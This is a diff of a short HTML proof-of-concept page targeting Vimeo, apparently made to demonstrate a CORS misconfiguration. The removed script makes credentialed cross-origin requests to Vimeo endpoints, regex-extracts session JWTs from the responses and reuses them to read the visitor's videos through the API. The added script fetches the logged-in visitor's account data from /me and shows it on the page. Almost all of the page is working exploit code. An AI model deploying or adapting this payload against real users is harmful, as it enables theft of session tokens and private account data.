@@ -1,73 +1,25 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Vimeo CORS Misconfiguration + JWT Leak PoC</title>
+  <title>Vimeo CORS PoC</title>
 </head>
 <body>
-  <h1>Vimeo CORS Misconfiguration + JWT Leak PoC</h1>
+  <h1>Testing Vimeo CORS Misconfiguration</h1>
   <pre id="output">Loading...</pre>
+
   <script>
-    async function runPoC() {
-      let log = "";
-
+    (async () => {
       try {
-        // --- Path #1: Extract JWT from homepage ---
-        log += "[*] Fetching Vimeo homepage...\n";
-        const homeRes = await fetch("https://vimeo.com/", {
+        const res = await fetch("https://api.vimeo.com/me", {
+          method: "GET",
           credentials: "include"
         });
-        const homeText = await homeRes.text();
-
-        const jwtRegex = /"jwt"\s*:\s*"([^"]+)"/;
-        const homeMatch = homeText.match(jwtRegex);
-
-        let homepageJWT = null;
-        if (homeMatch) {
-          homepageJWT = homeMatch[1];
-          log += "[+] Extracted JWT from homepage:\n" + homepageJWT + "\n\n";
-        } else {
-          log += "[-] No JWT found in homepage.\n\n";
-        }
-
-        // --- Path #2: Extract JWT from /upload/config ---
-        log += "[*] Fetching /upload/config...\n";
-        const configRes = await fetch("https://api.vimeo.com/upload/config", {
-          credentials: "include"
-        });
-        const configJson = await configRes.json();
-
-        let configJWT = configJson?.api?.jwt || null;
-        if (configJWT) {
-          log += "[+] Extracted JWT from /upload/config:\n" + configJWT + "\n\n";
-        } else {
-          log += "[-] No JWT found in /upload/config response.\n\n";
-        }
-
-        // --- Use whichever JWT we have to call an API ---
-        const finalJWT = homepageJWT || configJWT;
-        if (finalJWT) {
-          log += "[*] Using JWT to fetch user videos...\n";
-          const videosRes = await fetch(
-            "https://api.vimeo.com/users/me/videos?per_page=1",
-            {
-              headers: { Authorization: "jwt " + finalJWT }
-            }
-          );
-          const videos = await videosRes.json();
-          log += "[+] API response:\n" + JSON.stringify(videos, null, 2) + "\n";
-        } else {
-          log += "[-] No JWT available to call API.\n";
-        }
-
-      } catch (err) {
-        log += "[!] Error: " + err + "\n";
-        console.error(err);
+        const text = await res.text();
+        document.getElementById("output").textContent = text;
+      } catch (e) {
+        document.getElementById("output").textContent = "Error: " + e;
       }
-
-      document.getElementById("output").textContent = log;
-    }
-
-    runPoC();
+    })();
   </script>
 </body>
 </html>
